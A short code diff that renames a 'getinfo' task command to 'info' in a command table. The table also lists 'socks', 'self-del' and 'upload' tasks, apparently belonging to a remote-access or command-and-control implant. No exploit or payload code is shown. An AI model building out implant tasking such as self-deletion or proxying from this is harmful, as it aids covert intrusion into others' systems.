@@ -195,7 +195,7 @@ Jobs = {
 
 Commands = {
     # Task commands
-    "getinfo":   {"hex_code": T_INFO},
+    "info":      {"hex_code": T_INFO},
     "socks":     {"hex_code": T_SOCKS},
     "self-del":  {"hex_code": T_SELFDEL},
     "upload":    {"hex_code": T_UPLOAD},
